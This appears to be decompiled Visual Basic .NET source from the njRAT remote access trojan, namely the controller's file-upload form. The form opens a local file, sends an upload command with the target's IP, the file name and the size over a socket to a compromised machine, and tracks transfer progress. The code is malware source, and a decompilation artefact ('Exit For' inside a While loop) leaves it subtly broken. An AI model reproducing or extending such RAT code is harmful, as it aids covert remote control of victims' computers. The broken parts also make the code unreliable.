Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x02000027 RID: 39
	<DesignerGenerated()>
	Public Partial Class up
		Inherits Form

		' Token: 0x06000549 RID: 1353 RVA: 0x00174FD0 File Offset: 0x001733D0
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = up.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = up.__ENCList.Count = up.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = up.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = up.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								up.__ENCList(num) = up.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					up.__ENCList.RemoveRange(num, up.__ENCList.Count - num)
					up.__ENCList.Capacity = up.__ENCList.Count
				End If
				up.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x170001DD RID: 477
		' (get) Token: 0x0600054C RID: 1356 RVA: 0x00175528 File Offset: 0x00173928
		' (set) Token: 0x0600054D RID: 1357 RVA: 0x00175540 File Offset: 0x00173940
		Friend Overridable Property ProgressBar1 As ProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._ProgressBar1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ProgressBar)
				Me._ProgressBar1 = value
			End Set
		End Property

		' Token: 0x170001DE RID: 478
		' (get) Token: 0x0600054E RID: 1358 RVA: 0x0017554C File Offset: 0x0017394C
		' (set) Token: 0x0600054F RID: 1359 RVA: 0x00175564 File Offset: 0x00173964
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim flag As Boolean = Me._Button1 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				flag = (Me._Button1 IsNot Nothing)
				If flag Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001DF RID: 479
		' (get) Token: 0x06000550 RID: 1360 RVA: 0x001755C4 File Offset: 0x001739C4
		' (set) Token: 0x06000551 RID: 1361 RVA: 0x001755DC File Offset: 0x001739DC
		Friend Overridable Property Lv1 As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._Lv1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Me._Lv1 = value
			End Set
		End Property

		' Token: 0x170001E0 RID: 480
		' (get) Token: 0x06000552 RID: 1362 RVA: 0x001755E8 File Offset: 0x001739E8
		' (set) Token: 0x06000553 RID: 1363 RVA: 0x00175600 File Offset: 0x00173A00
		Friend Overridable Property vmethod_4 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_4_Tick
				Dim flag As Boolean = Me._vmethod_4 IsNot Nothing
				If flag Then
					RemoveHandler Me._vmethod_4.Tick, value2
				End If
				Me._vmethod_4 = value
				flag = (Me._vmethod_4 IsNot Nothing)
				If flag Then
					AddHandler Me._vmethod_4.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170001E1 RID: 481
		' (get) Token: 0x06000554 RID: 1364 RVA: 0x00175660 File Offset: 0x00173A60
		' (set) Token: 0x06000555 RID: 1365 RVA: 0x00175678 File Offset: 0x00173A78
		Friend Overridable Property ColumnHeader1 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader1 = value
			End Set
		End Property

		' Token: 0x170001E2 RID: 482
		' (get) Token: 0x06000556 RID: 1366 RVA: 0x00175684 File Offset: 0x00173A84
		' (set) Token: 0x06000557 RID: 1367 RVA: 0x0017569C File Offset: 0x00173A9C
		Friend Overridable Property ColumnHeader2 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader2 = value
			End Set
		End Property

		' Token: 0x06000558 RID: 1368 RVA: 0x001756A8 File Offset: 0x00173AA8
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.up_FormClosing
			AddHandler MyBase.Load, AddressOf Me.up_Load
			up.__ENCAddToList(Me)
			Me.Closinge = False
			Me.os = 0
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000559 RID: 1369 RVA: 0x00175704 File Offset: 0x00173B04
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Me.Close()
		End Sub

		' Token: 0x0600055A RID: 1370 RVA: 0x00175710 File Offset: 0x00173B10
		Private Sub up_FormClosing(sender As Object, e As FormClosingEventArgs)
			Me.Closinge = True
			Try
				Me.FS.Close()
				Me.FS.Dispose()
			Catch ex As Exception
			End Try
			Try
				Me.sk.Close()
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x0600055B RID: 1371 RVA: 0x0017578C File Offset: 0x00173B8C
		Private Sub up_Load(sender As Object, e As EventArgs)
			Me.FS = New FileStream(Me.TMP, FileMode.Open)
			Me.Lv1.Items(0).SubItems(0).Text = New FileInfo(Me.TMP).Name
			Me.Lv1.Items(1).SubItems(0).Text = Class6.smethod_17(CLng(Me.SZ))
			Me.Lv1.Items(2).SubItems(0).Text = Class6.smethod_17(0L)
			Me.Lv1.Items(3).SubItems(0).Text = Class6.smethod_17(0L)
			Me.ProgressBar1.Maximum = Me.SZ
			Me.osk.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "up", Class7.string_1, Me.osk.ip(), Class7.string_1, Class6.smethod_14(Me.FN), Class7.string_1, Conversions.ToString(Me.SZ) }))
			Me.Lv1.method_3()
			Me.vmethod_4.Enabled = True
		End Sub

		' Token: 0x0600055C RID: 1372 RVA: 0x0017591C File Offset: 0x00173D1C
		Private Sub vmethod_4_Tick(sender As Object, e As EventArgs)
			Try
				Me.Lv1.Items(2).SubItems(1).Text = Class6.smethod_17(CLng((Me.ProgressBar1.Value - Me.os)))
				Me.os = Me.ProgressBar1.Value
				Me.Lv1.Items(3).SubItems(1).Text = Class6.smethod_17(CLng(Me.ProgressBar1.Value))
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x04000279 RID: 633
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x0400027B RID: 635
		<AccessedThroughProperty("ProgressBar1")>
		Private _ProgressBar1 As ProgressBar

		' Token: 0x0400027C RID: 636
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x0400027D RID: 637
		<AccessedThroughProperty("Lv1")>
		Private _Lv1 As GClass9

		' Token: 0x0400027E RID: 638
		<AccessedThroughProperty("vmethod_4")>
		Private _vmethod_4 As Timer

		' Token: 0x0400027F RID: 639
		<AccessedThroughProperty("ColumnHeader1")>
		Private _ColumnHeader1 As ColumnHeader

		' Token: 0x04000280 RID: 640
		<AccessedThroughProperty("ColumnHeader2")>
		Private _ColumnHeader2 As ColumnHeader

		' Token: 0x04000281 RID: 641
		Public Closinge As Boolean

		' Token: 0x04000282 RID: 642
		Public FN As String

		' Token: 0x04000283 RID: 643
		Public FS As FileStream

		' Token: 0x04000284 RID: 644
		Public os As Integer

		' Token: 0x04000285 RID: 645
		Public osk As Client

		' Token: 0x04000286 RID: 646
		Public sk As Client

		' Token: 0x04000287 RID: 647
		Public SZ As Integer

		' Token: 0x04000288 RID: 648
		Public TMP As String
	End Class
End Namespace
